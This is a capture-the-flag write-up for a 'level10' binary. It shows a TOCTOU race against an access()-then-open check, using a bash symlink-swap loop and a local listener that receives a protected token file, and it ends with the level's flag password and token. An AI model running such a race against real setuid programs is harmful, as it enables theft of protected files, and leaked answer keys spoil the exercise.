# A binary designed to connect to a remote host on port 6969 and send a file to the host.

# We want to read the token file
- When we first run the executable, we have: 
```
./level10 file host
        sends file to host if you have access to it
```

- The program checks if there are 3 arguments.

- If it does not have access to the first argument (the file), it returns a message and terminates.
- Therefore, we need to create access to the file named "token".

# The binary attempts to connect on port 6969.
- Use ghidra to know that, so scp -P 4242 level10@192.168.56.XXX:/home/user/level10/level10 ~/Downloads/   
- We can see 'Connecting to 6969'
- We can see by doing "./level10 .profile blabla"

- If it succeeds, it sends a message ".().\n" to the remote server.

# Create a server 
- python3 server.py on host
- on machine: 
    - echo "coucou" > /tmp/coucou
    - ./level10 /tmp/coucou 192.168.56.1 
- We receive information from server

# About token, its not about name, its about permission
- We can see a call of access very early

```
Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit, par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2),risque de créer un trou de sécurité. En effet, l'utilisateur peut exploiter le petit intervalle de temps entre la vérification et l'accès pour modifier le fichier (via un lien symbolique en général). Pour cette raison, l'utilisation de cet appel système devrait être évitée.
```

- So, we'll create a symbolic link either for token to read it and to /tmp/coucou to by pass permission, on a infinite loop for a 'race condition'

```bash
$(while true; do ln -sf /tmp/coucou /tmp/faketoken; ln -sf $(pwd)/token /tmp/faketoken; done)&
```
# We need to send the symlink to the server, a lot of time

```bash
./level10 /tmp/faketoken 192.168.56.1 
```

# then flag and token 
su flag10 = woupa2yuojeeaaed06riuj63c
token = feulo4b72j7edeahuete3no7c
